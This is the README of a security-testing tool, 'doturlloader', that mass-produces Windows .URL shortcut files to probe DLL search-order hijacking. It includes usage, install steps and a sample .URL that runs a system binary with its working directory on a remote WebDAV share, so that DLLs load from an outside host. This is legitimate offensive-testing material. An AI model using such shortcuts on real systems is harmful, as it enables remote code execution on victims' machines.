# doturlloader

## Objective
```
Automation to create Microsoft .URL files. This can be helpful for batch testing processes, their inherent linked
DLLs, and possible path hijacking.

```

## Microsoft .URL file format
```
[InternetShortcut]
URL=<path to executable>
WorkingDirectory=<path to working directory>
```

## Usage
```
$ ./doturlloader -h
Example Usage: ./doturlloader --infile executable.txt
Example Usage: ./doturlloader --infile executable.txt --outdir samples --dll '\\stacktitan\webdav'
Note: the hash2filepath.txt is auto generated and contains a hash of the literal executable filepath and the hash itself

Flags: ./doturlloader {OPTION]...
  -i, --infile string   Path: the file containing a list of exe absolute paths
  -o, --outdir string   Path: the output directory to store the generated .URL files (default ./tmp/ (default "tmp")
  -d, --dll string      Path: the UNC|Webdav/dll to include within the .URL file (optional)
```

## Installation
```
Installation
---------------------------------------------------
Install GO (tested on go version go1.8.3 linux/amd64)
Git clone this repo (git clone https://github.com/packetassailant/doturlloader.git)
cd into the repo and type go build (you will now have a doturlloader binary)
```

## Sample Run
```
$ ./doturlloader --infile executables.txt --dll '\\stacktitan.com\webdav' 
There was an error creating the directory
Wrote 109 bytes to file: 416e684adf8a5eaab6b43456875d1196.URL
Wrote 114 bytes to file: 3e82e171d8fcf24a3b9542bb4c633188.URL
Wrote 116 bytes to file: 779d55b6a1a62ea4d951b4533424938c.URL
[Snip for Brevity]

```

## Sample .URL file output
```
[InternetShortcut]
URL=C:\Windows\winsxs\x86_wpf-terminalserverwpfwrapperexe_31bf3856ad364e35_6.1.7601.22733_none_26d9913d431071f6\TsWpfWrp.exe
WorkingDirectory=\\stacktitan.com\webdav

```

## Sample hash2filepath.txt file output
```
$ cat tmp/hash2filepath.txt |head -n 5
416e684adf8a5eaab6b43456875d1196 : C:\Windows\bfsvc.exe
3e82e171d8fcf24a3b9542bb4c633188 : C:\Windows\explorer.exe
779d55b6a1a62ea4d951b4533424938c : C:\Windows\fveupdate.exe
77846b8271f562eeb4a5bd2ea6a2ae6c : C:\Windows\HelpPane.exe
c972a0c8294b3af5edc360394623dcc9 : C:\Windows\hh.exe

```

## Developing
```
Alpha code under active development
```

## Contact
```
# Author: Chris Patten
# Contact (Email): chris[t.a.]stacktitan[t.o.d]com
# Contact (Twitter): packetassailant
```